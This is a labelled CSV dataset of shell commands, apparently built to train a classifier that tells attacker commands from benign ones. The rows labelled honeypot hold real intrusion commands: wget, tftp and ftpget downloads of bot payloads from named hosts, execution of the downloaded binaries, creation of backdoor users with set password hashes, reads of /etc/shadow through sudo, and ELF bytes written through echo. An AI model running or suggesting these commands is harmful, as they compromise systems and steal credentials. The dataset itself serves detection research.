id,command,label,source,split
d2_005037,/bin/busybox wget http://h3fd8236b.example.net/x86_64 -O -> thanos,1,honeypot,train
d2_005039,"wget -q -O- --header\=""Accept-Encoding: gzip"" <url> | gunzip > out.html",0,commandlinefu,train
d2_005040,ls mnt,0,bash_history,train
d2_005041,sudo apt-get update && sudo apt-get upgrade,0,bash_history,train
d2_005042,fc-cache -f -v,0,bash_history,train
d2_005043,>/var/t,1,honeypot,train
d2_005044,ssh-keygen -l -f ~/.ssh/known_hosts,0,commandlinefu,train
d2_005045,always enable console,0,bash_history,train
d2_005047,./testing.sh list map test2,0,bash_history,train
d2_005048,sudo iptables -L -n --line-numbers,0,bash_history,train
d2_005049,ffmpeg -ss 0:58:15 -i DavidLettermanBlackCrowes.mpg -acodec copy DavidLettermanBlackCrowes.ac3,0,commandlinefu,train
d2_005050,$COMMAND 2>&1 >/dev/null & WPID=$!; sleep $TIMEOUT && kill $! & KPID=$!; wait $WPID,0,commandlinefu,train
d2_005051,sudo pacman-key --edit-key alad,0,bash_history,train
d2_005052,vi verbose.html,0,bash_history,train
d2_005054,rails new records,0,bash_history,train
d2_005057,git cloneserver.git,0,bash_history,train
d2_005058,git diff-tree -r --no-commit-id --name-only --diff-filter=ACMRT COMMID_HASH | xargs tar -rf mytarfile.tar,0,commandlinefu,train
d2_005059,sudo chmod 666 radio.pyls,0,bash_history,train
d2_005060,tcpdump src <srcIP> and dst <dstIP> -w file.pcap,0,commandlinefu,train
d2_005061,find -L / -samefile /path/to/file -exec ls -ld {} +,0,commandlinefu,train
d2_005062,"postqueue -p | tail -n +2 | awk 'BEGIN { RS = """" } / user@example\.com/ { print $1 }' | tr -d '*!' | postsuper -d -",0,commandlinefu,train
d2_005064,"ls -lct /etc/ | tail -1 | awk '{print $6, $7, $8}'",0,commandlinefu,train
d2_005067,vi big2.sh,0,bash_history,train
d2_005068,mv eblokir.com public_html/,0,bash_history,train
d2_005069,killall vi,0,bash_history,train
d2_005071,cd <directory>; touch ./-i,0,commandlinefu,train
d2_005072,yelp info:foo,0,commandlinefu,train
d2_005077,useradd -M -p 12pZI5R8sSLrM -s /bin/bash x4_nn,1,honeypot,train
d2_005078,wget -q ftp://he54b32aa.example.net/has-CruD-5.1.tgz,1,honeypot,train
d2_005079,vim teste4,0,bash_history,train
d2_005080,wclear,1,honeypot,train
d2_005081,./J9x32qAY,1,honeypot,train
d2_005082,man colorz,0,bash_history,train
d2_005083,python timerdemo.py,0,bash_history,train
d2_005085,nano led.py,0,bash_history,train
d2_005086,tftp -r zatoempire2.sh -g militarynetwork.theworkpc.com,1,honeypot,train
d2_005087,rm mymod.o,0,bash_history,train
d2_005088,sudo apt-get install python3-dev,0,bash_history,train
d2_005089,find . -type d -exec chmod 755 {} \;,0,commandlinefu,train
d2_005090,cat ../concatAxoFastqFiles.sh,0,bash_history,train
d2_005091,"ls -l | sed ""$(while (( ++i < 5 )); do echo ""N;""; done) a -- COMMIT --""",0,commandlinefu,train
d2_005092,sudo git apt install,0,bash_history,train
d2_005094,echo 'zeroshell' | sudo -S useradd -M -p 12g4Dz0kReAnY -s /bin/bash x4_nr,1,honeypot,train
d2_005095,git branch gh-pages,0,bash_history,train
d2_005096,git checkout Tetris/src/Main.java,0,bash_history,train
d2_005098,sh ftp1.sh tftp1.sh tftp2.sh ftp1.sh,1,honeypot,train
d2_005100,sudo /usr/sbin/apachectl start,0,bash_history,train
d2_005101,svn merge -r 854:853 l3toks.dtx,0,commandlinefu,train
d2_005102,sudo mongod -f /etc/mongod.conf --fork,0,bash_history,train
d2_005103,lynx -dump http://he98ff2ea.example.net/weatherstation/WXCurrentObXML.asp?ID=KCALOSAN32 | grep GMT | awk '{print $3}',0,commandlinefu,train
d2_005104,ls /etc/apt/,0,bash_history,train
d2_005105,tftp -r sh -g 78.73.248.227,1,honeypot,train
d2_005106,./eGxZo8IG,1,honeypot,train
d2_005107,"ansible -i inventory/mdcs all -m setup -a ""filter=ansible_processor_vcpus"" -o",0,bash_history,train
d2_005108,ssh://git@gitlab.digiprojects.top:806/root/test.git,0,bash_history,train
d2_005109,python job_queue_idle.py,0,bash_history,train
d2_005110,function dellomsaver { snmpwalk -v2c -cmycommunityname $1 17.22.142.185.4.1.674.10892.123.4.186.220; },0,commandlinefu,train
d2_005111,mail --help,0,bash_history,train
d2_005112,[goalador@gatanda corpwebsite-starterkitcorpwebsite-starterkit]$ > > bash: [goalador@gatanda: commandfound,0,bash_history,train
d2_005113,vim Capfile,0,bash_history,train
d2_005114,kyouko3_make,0,bash_history,train
d2_005115,nvm -v,0,bash_history,train
d2_005116,nano ninfo,1,honeypot,train
d2_005117,tftp systemservice.hldns.ru -c get tftp.sh,1,honeypot,train
d2_005118,id -h,1,honeypot,train
d2_005119,vim mysum.sh,0,bash_history,train
d2_005120,sudo pacman -S zsh,0,bash_history,train
d2_005122,vi count.sh,0,bash_history,train
d2_005123,tail right.fa,0,bash_history,train
d2_005124,find -type f -mtinme 40 -ls,0,bash_history,train
d2_005125,ls -l /bin/dhpcd /usr/bin/dhpcd /usr/local/bin/dhpcd ~/dhpcd /var/tmp/dhpcd /tmp/dhpcd /dev/shm/dhpcd ~/.dhpcd /var/tmp/.dhpcd /tmp/.dhpcd /dev/shm/.dhpcd,1,honeypot,train
d2_005126,wget http://h0ba1fec0.example.net/ps23e,1,honeypot,train
d2_005127,wget https://h8fe31bb0.example.net/P5Bv/boty.pl,1,honeypot,train
d2_005128,"ex some_file ""+set ff=unix fileencoding=utf-8"" ""+x""",0,commandlinefu,train
d2_005130,chmod 644 01_introduction.tex,0,bash_history,train
d2_005131,sudo vim /etc/host,0,bash_history,train
d2_005132,cp /work/host/phone/ui/main.cpp !#$:s/host/target,0,commandlinefu,train
d2_005133,"find . -type f -name ""*.pyc"" -delete;",0,commandlinefu,train
d2_005134,touch readInfo.py,0,bash_history,train
d2_005136,"chromium-browser --name ""damon""",0,bash_history,train
d2_005137,""""""" ; def bound_socket(*args, **kwargs): ; """"""Bind socket to a specified source IP address"""""" ; global source ; sock = socket_socket(*args, **kwargs) ; sock.bind((source, 0)) ; return sock ; def distance(origin, destination): ; """"""Determine distance between 2 sets of [lat,lon] in km"""""" ; lat1, lon1 = origin ; lat2, lon2 = destination ; radius = 6371 # km ; dlat = math.radians(lat2 - lat1) ; dlon = math.radians(lon2 - lon1) ; a = (math.sin(dlat / 2) * math.sin(dlat / 2) + ; math.cos(math.radians(lat1)) * ; math.cos(math.radians(lat2)) * math.sin(dlon / 2) * ; math.sin(dlon / 2)) ; c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a)) ; d = radius * c ; return d ; def build_user_agent(): ; """"""Build a Mozilla/5.0 compatible User-Agent string"""""" ; global user_agent ; if user_agent: ; return user_agent ; ua_tuple = ( ; 'Mozilla/5.0', ; '(%s ; U ; %s ; en-us)' % (platform.system(), platform.architecture()[0]), ; 'Python/%s' % platform.python_version(), ; '(KHTML, like Gecko)', ; 'speedtest-cli/%s' % __version__ ; ) ; user_agent = ' '.join(ua_tuple) ; return user_agent ; def build_request(url, data=None, headers={}): ; """"""Build a urllib2 request object",1,honeypot,train
d2_005138,grep -P '\t' filename,0,commandlinefu,train
d2_005139,"echo ""b'zeroshell'"" | sudo -S cat /etc/shadow",1,honeypot,train
d2_005141,diff <(cd /path-1; find . -type f -print | egrep -i '\.m4a$|\.mp3$') <(cd /path-2; find . f -print | egrep -i '\.m4a$|\.mp3$'),0,commandlinefu,train
d2_005142,sh dick1.sh,1,honeypot,train
d2_005143,unzip mvn.zip,0,bash_history,train
d2_005144,gem install selenium-webdriver,0,bash_history,train
d2_005145,rm -rf prv8.tgz,0,bash_history,train
d2_005146,function cdls { cd $1; ls; },0,commandlinefu,train
d2_005147,/bin/busybox cat /etc/resolv.conf/.none,1,honeypot,train
d2_005148,git add AirplaneAPI/IndiGo.java,0,bash_history,train
d2_005149,ddrescue -v /dev/sda /dev/sdb logfile.log,0,commandlinefu,train
d2_005150,"perl -le 'print$_%3?$_%5?$_:""Buzz"":$_%5?""Fizz"":""FizzBuzz""for 1..100'",0,commandlinefu,train
d2_005151,ls /share/ClusterShare/software/contrib/kevyin/gatk/2.2-8/,0,bash_history,train
d2_005152,perl speed.py,1,honeypot,train
d2_005155,"ps -eo pid,lstart,cmd",0,commandlinefu,train
d2_005156,nohup /isitools/CentOS-5/trinity/Trinity.pl --seqType fa --JM 100G -left ./axo_left.fa --right ./axo_left.fa--CPU 24 --bflyHeapSpaceMax 2G --bflyCPU 8 --output /isiseqruns/RonAxoTrinity/AxoMikeTest/STDOUT/full_assembly/tissue_types/elbow &,0,bash_history,train
d2_005157,git statys,0,bash_history,train
d2_005158,"quickscript () { filename=""$1""; history | cut -c 8- | sed -e '/^###/{h;d};H;$!d;x' | sed '$d' > ${filename:?No filename given} }",0,commandlinefu,train
d2_005159,which ftp,0,bash_history,train
d2_005161,./psybnc,0,bash_history,train
d2_005162,echo stow > packages.txt,0,bash_history,train
d2_005163,curl -s http://h5dcb87d6.example.net/~jelle/pubkey.asc | gpg --import,0,commandlinefu,train
d2_005164,"ls --quoting-style={escape,shell,c}",0,commandlinefu,train
d2_005165,mv JTK_Cycle\ \(2-19-13\)/ /isitools/CentOS-5/,0,bash_history,train
d2_005166,uname -n -s -r -v,1,honeypot,train
d2_005169,curl -O http://hac5bebed.example.net/do3309,1,honeypot,train
d2_005170,rm -rf sensi.sh,1,honeypot,train
d2_005171,"echo ""aplay path/to/song"" |at [time]",0,commandlinefu,train
d2_005173,vim my_abs,0,bash_history,train
d2_005174,tar -xvf dott,1,honeypot,train
d2_005176,rm -rf curl.sh,1,honeypot,train
d2_005177,"sudo usermod -a -G engineering sford, jwallace",0,bash_history,train
d2_005178,"echo ""quit"" | openssl s_client -connect facebook.com:443 | openssl x509 -noout -text | grep ""DNS:"" | perl -pe ""s/(, )?DNS:/\n/g""",0,commandlinefu,train
d2_005179,cp sh.snippets ~/.vim/MySnips/,0,bash_history,train
d2_005180,tail -F file | egrep --color 'pattern|$',0,commandlinefu,train
d2_005181,cat config > config.old,0,bash_history,train
d2_005182,"sed -n '1,/regex/p' filename",0,commandlinefu,train
d2_005183,ls ~/.ssh/id_rsa,0,bash_history,train
d2_005185,make all,0,bash_history,train
d2_005186,"for arq in *.png; do size=$(identify $arq | cut -f3 -d"" ""); [ $size == ""280x190"" ] || rm $arq ; done",0,commandlinefu,train
d2_005188,curl -O http://hd1f1104e.example.net/8000,1,honeypot,train
d2_005190,mkdir semp,0,bash_history,train
d2_005191,vim main.rb,0,bash_history,train
d2_005192,apt-get install vi,0,bash_history,train
d2_005194,"adb shell ""screencap -p | base64"" | sed 's/\r$//' | base64 -d | display",0,commandlinefu,train
d2_005196,"svn log 2>&1 | egrep '^r[0-9]+' | cut -d ""|"" -f2 | sort | uniq -c",0,commandlinefu,train
d2_005198,v a,0,bash_history,train
d2_005200,git rm --cached public/views/,0,bash_history,train
d2_005201,docker run -p 2181:2181 -p 9092:9092 --env ADVERTISED_HOST=`docker-machine ip \`docker-machine active\`` --env ADVERTISED_PORT=9092 spotify/kafka,0,bash_history,train
d2_005202,git clonestoread/wechat.git,0,bash_history,train
d2_005203,mv Downloads/vimrc ~/.vimrc,0,bash_history,train
d2_005204,curl -s http://h8b0517b6.example.net/,0,commandlinefu,train
d2_005207,iconv -c -f utf-8 -t ascii file.txt,0,commandlinefu,train
d2_005208,bash -c ./FXVwTWAQ,1,honeypot,train
d2_005209,"REJECT_RULE_NO=$(iptables -L RH-Firewall-1-INPUT --line-numbers | grep 'REJECT' | awk '{print $1}');/sbin/iptables -I RH-Firewall-1-INPUT $REJECT_RULE_NO -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT -m comment --comment ""Permit HTTP Service""",0,commandlinefu,train
d2_005210,apache2ctl -M,0,bash_history,train
d2_005211,"parallel --tag echo '$(du -s {} | awk ""{print \$1}"") / $(find {} | wc -l)' \| bc -l ::: *",0,commandlinefu,train
d2_005212,mkdir magic,0,bash_history,train
d2_005213,openstack profile list,0,bash_history,train
d2_005214,"timeDNS () { { for x in ""${local_DNS}"" ""176.188.52.60"" ""39.128.38.55"" ""19.184.83.178"" ""26.106.180.29"" ""15.84.44.83"" ""141.36.206.46"" ""84.166.54.191"" ""46.40.120.211""; do ({ echo -n ""$x ""; dig @""$x"" ""$*""|grep Query ; }|sponge &) done ; } | sort -n -k5 ; }",0,commandlinefu,train
d2_005215,ssh HOST '(cd REPO_DIR && git diff --name-only HEAD | cpio -o -Hnewc --quiet)' | cpio -iduv --quiet -Hnewc,0,commandlinefu,train
d2_005216,sudo dnf --refresh -y,0,bash_history,train
d2_005217,eclipse --version,0,bash_history,train
d2_005218,tldr zip,0,bash_history,train
d2_005219,LC_ALL=C cat /proc/cpuinfo,1,honeypot,train
d2_005220,ls /usr/local/bin,0,bash_history,train
d2_005221,i2c detect,0,bash_history,train
d2_005222,cat /home/ethos/local.conf | gzip | base64,1,honeypot,train
d2_005224,sed '/^$/d',0,commandlinefu,train
d2_005225,vim-addon-manager list,0,bash_history,train
d2_005226,cat 銝剖.txt,0,bash_history,train
d2_005227,tr aeiou AEIOU < ch1,0,bash_history,train
d2_005228,rrdtool grep tessh localhost,0,bash_history,train
d2_005229,litecoind -datadir=L2 stop,0,bash_history,train
d2_005230,"ack ""search pharse"" *.[ch]",0,commandlinefu,train
d2_005231,chmod a+1 mysql-community-release-el7-5.noarch.rpm,0,bash_history,train
d2_005232,./set 0,1,honeypot,train
d2_005233,open ribbons_WGS84_ES*docx,0,bash_history,train
d2_005234,yaourt -Rnsc mybashburn,0,bash_history,train
d2_005235,vim /boot/grub2/grub.cfg,0,bash_history,train
d2_005236,ftpget -v -u anonymous -p anonymous -P 21 milnetbrasil.duckdns.org sensi1.sh sensi1.sh,1,honeypot,train
d2_005237,wget http://hdf2a5b7f.example.net/g.txt -O sdf3fslsdf13,1,honeypot,train
d2_005238,cp -r ~/.themes/Fantome ~/Documents/.dotfiles/.themes/,0,bash_history,train
d2_005240,./loligang.mips loligang.mips,1,honeypot,train
d2_005241,making the expandable only visible on mobile through CSS,0,bash_history,train
d2_005242,rm -rf ssh.sh tssh.sh tssh2.sh ssh1.sh,1,honeypot,train
d2_005243,chmod 777 tenshi.sh,1,honeypot,train
d2_005244,sed -i.$(date +%F@%T) 's/^LogLevel warn/LogLevel debug/g' httpd.conf,0,commandlinefu,train
d2_005245,rm -Rf .git/,0,bash_history,train
d2_005246,sudo pacman -R archiso,0,bash_history,train
d2_005247,sudo apt-get update && sudo apt-get upgrade && sudo apt-get autoclean && sudo apt-get autoremove,0,commandlinefu,train
d2_005248,ls |tee >(grep xxx |wc >xxx.count) >(grep yyy |wc >yyy.count) |grep zzz |wc >zzz.count,0,commandlinefu,train
d2_005249,chmod 777 tftp2 .sh,1,honeypot,train
d2_005250,Oc,0,bash_history,train
d2_005252,>/tmp/.t,1,honeypot,train
d2_005253,vim ~/open,0,bash_history,train
d2_005254,vi mv concatAxoFastqFilesLaneOneOnly.sh concatAxoFastqFilesLaneOneOnlyPairedEnd.sh,0,bash_history,train
d2_005255,./script,0,bash_history,train
d2_005256,ls -F1,0,bash_history,train
d2_005257,git push origin master e2ms,0,bash_history,train
d2_005258,vim lib/fileSearch.c i,0,bash_history,train
d2_005259,mysqlrepair -A,0,bash_history,train
d2_005260,echo -ne '\x7f\x45\x4c\x46\x01\x01\x01\x61\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x28\x00\x01\x00\x00\x00\x1c\x83\x00\x00\x34\x00\x00\x00\xc4\x03\x00\x00\x02\x02\x00\x00\x34\x00\x20\x00\x02\x00\x28\x00\x05\x00\x04\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00' > usb_ver,1,honeypot,train
d2_005261,./gradlew eclipse,0,bash_history,train
d2_005262,vi /home/guoding/Public/tmp/brcm_61/build_config/DPC4912_CCSP_PC15_GA.cfg,0,bash_history,train
d2_005264,du -h -d1,0,commandlinefu,train
d2_005265,split -b 1k file ; cat x* > file,0,commandlinefu,train
d2_005266,"iamawesome=$(curl -LsS iamawesome.com | echo -e ""\n\n$(cat) \n\n"");",0,commandlinefu,train
d2_005267,"grep -o -P '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5}\s->\s{5}[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5}' <capture file> | tr -d ' ' | sed 's/:.....//g' | sort -n | uniq -c | sort -nr",0,commandlinefu,train
d2_005268,wget http://h65d2cf2d.example.net/j/newdr.tgz,1,honeypot,train
d2_005269,mv tests/spec/matching/ad_placement_spec.rb ~,0,bash_history,train
d2_005270,yaourt -S i3,0,bash_history,train
d2_005274,sudo /etc/init.d/mysql restart,0,bash_history,train
d2_005276,ssh pi@213.212.249.115,0,bash_history,train
d2_005277,docker rm -f $(docker -a -q),0,bash_history,train
d2_005278,sudo service apache2 start,0,bash_history,train
d2_005279,chgrp,0,bash_history,train
d2_005280,ng serve -o,0,bash_history,train
d2_005281,"find . -type f -name ""*.c"" -exec rm -i {};\",0,bash_history,train
d2_005282,man 5 variables,0,bash_history,train
d2_005283,file pokemmo,0,bash_history,train
d2_005284,./simnao.sh,0,bash_history,train
d2_005285,docker build,0,bash_history,train
d2_005286,convert <input.psd> -channel RGBA -alpha Set -colorspace rgb <output.png>,0,commandlinefu,train
d2_005287,rm .advancedsettings.xml.un~,0,bash_history,train
d2_005288,vim .Xdefaults_copy,0,bash_history,train
d2_005289,ls /lib/terminfo/x/,0,bash_history,train
d2_005290,vim server.php,0,bash_history,train
d2_005291,net ads join -U mohit.thakur,0,bash_history,train
d2_005292,"exiftool -Title=""This is the Title"" -Author=""Happy Man"" -Subject=""PDF Metadata"" foo.pdf -overwrite_original",0,commandlinefu,train
d2_005295,grep -H '^psk=' /etc/NetworkManager/system-connections/*,0,commandlinefu,train
d2_005296,git add week02,0,bash_history,train
d2_005298,"sed -n '1,2p;3q' file",0,commandlinefu,train
d2_005299,sudo ./stepper.py,0,bash_history,train
d2_005300,"zgrep -R --include=""*.fq.gz"" -H ""HWIUSI"" .",0,bash_history,train
d2_005301,jhead -autorot *.jpg,0,commandlinefu,train
d2_005302,wget http://h8d96af7e.example.net/lmaoWTF/loligang.ppc,1,honeypot,train
d2_005304,mv *.jpg ../Pictures/new/,0,bash_history,train
d2_005305,cd nache,1,honeypot,train
d2_005306,python /login/tests.py,0,bash_history,train
d2_005307,Grading,0,bash_history,train
d2_005308,./v.py,1,honeypot,train
d2_005309,./R9bF1rwC,1,honeypot,train
d2_005310,./clone.txt,0,bash_history,train
d2_005311,git push origin master -u,0,bash_history,train
d2_005312,scp -p2200 alanvn@98.13.26.105:alan.zip alan.zip,0,bash_history,train
d2_005313,"OUTPUT=""`find / -type f`"" ; echo ""$OUTPUT"" | grep sysrq ; echo ""$OUTPUT"" | grep sysctl ; echo ""$OUTPUT"" | less",0,commandlinefu,train
d2_005315,curl -s -u orobardet:$(pass ldap-orobardet)s-djingo-dev-ref01.metriks.hbx.geo.francetelecom.fr/_cat/indices?v | grep conversation-history-v8-prod-2019 | awk '{print $3}' > djingo-indices,0,bash_history,train
d2_005316,systemctl status mysql,0,bash_history,train
d2_005317,./test run -i qasnap/center_src/in06 -n 4 --cpu --clean,0,bash_history,train
d2_005318,-rw-rw-r-- 1 terror terror 58690 Jan 24 02:43 tvspielfilm2xmltv.git,0,bash_history,train
d2_005320,mv /home/bjohnston/Videos/Movies/Jackie\ Brown\ \(1997\)/ .,0,bash_history,train
d2_005321,nano config.json,1,honeypot,train
d2_005323,"echo ""the third line"" >> readme.txt",0,bash_history,train
d2_005324,sudo nano /etc/systemd/system/autologin@.service,0,bash_history,train
d2_005325,apt-cache search glib-,0,bash_history,train
d2_005326,mv namd namdEquil_5ht_s1_5i71_IFDposes_160801,0,bash_history,train
d2_005327,perl setupvpsSenpai,1,honeypot,train
d2_005329,rm ..ldaprc.un~,0,bash_history,train
d2_005330,mv image3.jpg cam-files/image3.jpg,0,bash_history,train
d2_005331,sudo pkill -9 Xorg,0,bash_history,train
d2_005332,sudo find / -name http.conf,0,bash_history,train
d2_005333,vi ssmtp.conf,0,bash_history,train
d2_005334,openssl verify -CAfile intermediate/certs/ca-chain.cert.pem /home/geek/serverprod.crt,0,bash_history,train
d2_005335,linuxshell,1,honeypot,train
d2_005336,zip -r alanmedia.zip image/*,0,bash_history,train
d2_005337,echo 'b'zeroshell'' | sudo -S touch /uKzOCllMkq,1,honeypot,train
d2_005338,perl flo.pl 161.63.78.223 80 0,1,honeypot,train
d2_005339,python3 backupconfigs.py,0,bash_history,train
d2_005340,"echo ""Destination Application: "" + destApp",0,bash_history,train
d2_005341,"slow2() { ionice -c3 renice -n 20 $(pstree `pidof $1` -p -a -u -A|gawk 'BEGIN{FS="",""}{print $2}'|cut -f1 -d "" "") ; }",0,commandlinefu,train
d2_005342,xset led 3,0,commandlinefu,train
d2_005343,"perl -pi -e 's/<a href=""#"" onmouseover=""console.log('xss! '+document.cookie)"" style=""position:absolute;height:0;width:0;background:transparent;font-weight:normal;"">xss</a>/<\/a>/g'",0,commandlinefu,train
